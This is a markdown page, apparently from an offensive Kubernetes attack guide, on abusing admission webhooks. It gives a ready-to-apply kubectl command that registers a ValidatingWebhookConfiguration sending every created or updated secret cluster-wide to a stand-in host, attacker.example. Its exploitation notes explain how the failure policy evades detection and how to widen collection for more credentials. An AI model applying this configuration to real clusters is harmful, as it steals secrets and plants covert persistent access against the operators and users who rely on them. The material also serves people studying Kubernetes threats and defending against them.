---
title: "Admission webhooks: intercepting the API request path"
description: "Validating and mutating admission webhooks are called by the API server for matching object operations. An attacker who can create a webhook configuration inserts themselves into the request path: a validating webhook can exfiltrate every submitted object, including secrets, to an external endpoint, and a mutating webhook can alter objects as they are created, giving both persistence and cluster-wide visibility."
keywords:
  - admission webhook
  - validatingwebhookconfiguration
  - mutatingwebhookconfiguration
  - api interception
  - persistence
---

# Admission webhooks

Admission webhooks extend the API server: for configured object types and verbs, the API server calls out to a webhook endpoint before persisting the object. Validating webhooks can accept or reject; mutating webhooks can modify. An attacker who can create a `ValidatingWebhookConfiguration` or `MutatingWebhookConfiguration` inserts themselves into the API request path for whatever resources and operations they target. A validating webhook receives every matching object, so pointing one at `secrets` on create and update exfiltrates all new secrets to an external endpoint; a mutating webhook additionally rewrites objects, which is covered on its own page.

Requires create rights on webhook configurations:

```bash
kubectl auth can-i create validatingwebhookconfigurations
kubectl auth can-i create mutatingwebhookconfigurations
```

## Exfiltrate submitted objects

```bash
cat <<YAML | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata: { name: metrics-validator }
webhooks:
- name: v.attacker.example
  admissionReviewVersions: ["v1"]
  sideEffects: None
  failurePolicy: Ignore                 # do not break the cluster if the endpoint is down
  clientConfig: { url: "https://attacker.example/collect" }
  rules:
  - apiGroups: [""]
    apiVersions: ["v1"]
    operations: ["CREATE","UPDATE"]
    resources: ["secrets"]              # every new/updated secret is sent to the webhook
YAML
# the external endpoint receives an AdmissionReview JSON containing the full object
```

Each matching operation sends an `AdmissionReview` to the attacker's URL carrying the complete object, so every secret created or updated cluster-wide is exfiltrated as it happens.

## Exploitation notes

- `failurePolicy: Ignore` and `sideEffects: None` keep the webhook from breaking cluster operations if the endpoint is unavailable, which both avoids detection by outage and keeps the cluster healthy enough to keep feeding objects.
- Targeting `secrets` on CREATE/UPDATE turns the webhook into a live secret feed; widening `resources` captures more object types and thus more credentials and configuration.
- This is persistence plus continuous collection: it keeps delivering as long as the configuration exists, independent of any token.
- For active injection rather than passive capture, use a [Mutating webhook backdoor](mutating-webhook-backdoor.md).

## References

- [Kubernetes: dynamic admission control](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/)
- [Microsoft: Kubernetes threat matrix](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
